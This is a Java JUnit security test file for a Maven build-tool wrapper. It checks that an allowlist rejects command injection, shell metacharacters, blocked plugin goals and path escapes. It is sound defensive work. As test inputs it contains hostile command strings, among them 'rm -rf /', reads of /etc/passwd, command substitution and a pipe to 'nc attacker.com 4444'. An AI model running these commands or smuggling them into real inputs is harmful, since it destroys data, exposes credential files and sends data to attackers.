/*
 *
 *  Copyright 2025 Rahul Thakur
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package com.pragmatik.buildtools.maven;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatIllegalArgumentException;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Security and adversarial tests for command parsing and input validation.
 * <p>
 * Historically tested via the deprecated MavenService; now tests
 * {@link MavenInvoker#getCommands(String)} directly, which is the shared
 * command-validation engine used by all build tool implementations.
 */
@DisplayName("Security and adversarial tests")
class MavenSecurityTest {

    // ──────────────────────────────────────────────
    //  Command injection via getCommands()
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Command injection via getCommands() — blocked by allowlist")
    class CommandInjectionGetCommands {

        @Test
        @DisplayName("shell command chaining with && is rejected")
        void shellChainingWithDoubleAmpersand() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean && rm -rf /"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("shell command chaining with semicolon is rejected")
        void shellChainingWithSemicolon() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean ; cat /etc/passwd"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("shell command substitution with backticks is rejected")
        void shellCommandSubstitutionBackticks() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean `touch /tmp/pwned`"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("shell command substitution with dollar-paren is rejected")
        void shellCommandSubstitutionDollarParen() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean $(cat /etc/passwd)"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("pipe injection attempt is rejected")
        void pipeInjection() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean | nc attacker.com 4444"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("exec:exec plugin is blocked")
        void execExecBypass() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn exec:exec -Dexec.executable=/bin/sh"))
                    .withMessageContaining("Blocked plugin goal");
        }

        @Test
        @DisplayName("legitimate commands with safe flags pass allowlist")
        void legitimateCommandsPass() {
            String[] result = MavenInvoker.getCommands("mvn clean install -DskipTests");
            assertThat(result).containsExactly("clean", "install", "-DskipTests");
        }

        @Test
        @DisplayName("remote deploy is unavailable under ordinary build execution")
        void remoteDeployIsRejected() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean deploy"))
                    .withMessageContaining("Command not allowed");
            assertThat(new MavenBuildTool().getSupportedCommands()).doesNotContain("deploy");
        }
    }

    // ──────────────────────────────────────────────
    //  Unicode and encoding attacks
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Unicode and encoding attacks")
    class UnicodeAttacks {

        @Test
        @DisplayName("simple Unicode argument preserved")
        void unicodeArgumentsPreserved() {
            String[] result = MavenInvoker.getCommands("mvn clean -Dname=test");
            assertThat(result).containsExactly("clean", "-Dname=test");
        }

        @Test
        @DisplayName("zero-width characters in command are rejected")
        void zeroWidthCharacters() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn cle\u200Ban\u200B"))
                    .withMessageContaining("Command not allowed");
        }
    }

    // ──────────────────────────────────────────────
    //  Denial of service via long inputs
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Denial of service via long inputs")
    class LongInputAttacks {

        @Test
        @DisplayName("very long command does not crash (allowed tokens)")
        void veryLongCommand() {
            StringBuilder sb = new StringBuilder("mvn");
            for (int i = 0; i < 10000; i++) {
                sb.append(" clean");
            }
            String[] result = MavenInvoker.getCommands(sb.toString());
            assertThat(result).hasSize(10000);
        }
    }

    // ──────────────────────────────────────────────
    //  Security posture documentation
    // ──────────────────────────────────────────────

    @Nested
    @DisplayName("Security posture documentation")
    class SecurityPostureDocumentation {

        @Test
        @DisplayName("getCommands sanitizes and rejects shell metacharacters")
        void getCommandsNowSanitizesShellMetacharacters() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean && rm -rf /"))
                    .withMessageContaining("Command not allowed");
        }
    }

    @Nested
    @DisplayName("-D system properties are passed through (issue #97)")
    class SystemPropertyPassThrough {

        @Test
        @DisplayName("multiple legitimate -D flags pass through verbatim")
        void legitimateFlagsPass() {
            String[] result =
                    MavenInvoker.getCommands("mvn clean install -DskipTests -Dmaven.test.failure.ignore=true -B");
            assertThat(result)
                    .containsExactly("clean", "install", "-DskipTests", "-Dmaven.test.failure.ignore=true", "-B");
        }

        @ParameterizedTest
        @ValueSource(
                strings = {
                    "-f=../outside/pom.xml",
                    "--file=../outside/pom.xml",
                    "-s=../outside/settings.xml",
                    "--settings=../outside/settings.xml",
                    "--global-settings=../outside/settings.xml",
                    "--toolchains=../outside/toolchains.xml",
                    "-pl=../outside",
                    "--projects=../outside"
                })
        @DisplayName("project and credential file selectors cannot escape the allowed root")
        void pathSelectingOptionsAreRejected(String option) {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn validate " + option))
                    .withMessageContaining("flag");
        }

        @ParameterizedTest
        @ValueSource(
                strings = {
                    "-Dmaven.ext.class.path=../outside/ext.jar",
                    "-Dmaven.repo.local=../outside/repo",
                    "-Dmaven.multiModuleProjectDirectory=../outside",
                    "--Dmaven.repo.local=../outside/repo"
                })
        @DisplayName("Maven environment override properties cannot redirect outside the allowed root")
        void reservedMavenPropertiesAreRejected(String option) {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn validate " + option))
                    .withMessageContaining("flag");
        }

        @Test
        @DisplayName("shell metacharacters in a -D value are still rejected (no injection via values)")
        void shellMetacharsInPropertyValueRejected() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean -Dfoo=$(id)"))
                    .withMessageContaining("Invalid flag/argument");
        }
    }
}
